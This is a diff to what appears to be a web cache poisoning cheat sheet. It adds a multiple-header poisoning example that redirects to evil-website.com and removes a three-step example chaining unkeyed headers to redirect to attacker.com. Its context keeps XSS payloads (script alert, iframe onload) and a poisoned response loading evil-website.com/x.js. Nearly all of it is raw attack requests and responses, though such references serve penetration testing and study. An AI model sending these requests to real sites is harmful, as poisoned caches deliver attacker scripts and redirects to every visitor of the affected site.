@@ -52,7 +52,19 @@ X-Cache: miss, hit
 <img href="https://a.\"><script>alert(1)</script>a.png" />
 ```
 
-3. Seizing the Cache
+3. Multiple Header poisoning
+```
+GET / HTTP/1.1
+Host: www.vuln.com
+X-Forwarded-Host: evil-website.com
+X-Forwarded-Scheme: nothttps
+
+### Response:
+HTTP/1.1 301 Moved Permanently
+Location: https://evil-website.com/
+```
+
+4. Seizing the Cache
 ```
 GET / HTTP/1.1
 Host: unity3d.com
@@ -67,7 +79,7 @@ Cache-Control: public, max-age=1800
 <script src="https://evil-website.com/x.js"></script>
 ```
 
-4. Selective poisoning
+5. Selective poisoning
 ```
 GET / HTTP/1.1
 Host: redacted.com
@@ -80,39 +92,6 @@ X-Served-By: cache-lhr6335-LHR
 Vary: User-Agent, Accept-Encoding
 …
 <link rel="canonical" href="https://a">a<iframe onload=alert(1)>
-```
-
-5. Chaining Unkeyed Inputs 
-- First step
-```
-GET /en HTTP/1.1
-Host: redacted.net
-X-Forwarded-Host: xyz
-
-### Response:
-HTTP/1.1 200 OK
-Set-Cookie: locale=en; domain=xyz
-```
-- Second step
-```
-GET /en HTTP/1.1
-Host: redacted.net
-X-Forwarded-Scheme: nothttps
-
-### Response:
-HTTP/1.1 301 Moved Permanently
-Location: https://redacted.net
-```
-- Third step
-```
-GET /en HTTP/1.1
-Host: redacted.net
-X-Forwarded-Host: attacker.com
-X-Forwarded-Scheme: nothttps
-
-### Response:
-HTTP/1.1 301 Moved Permanently
-Location: https://attacker.com/en
 ```
 
 6. Route Poisoning
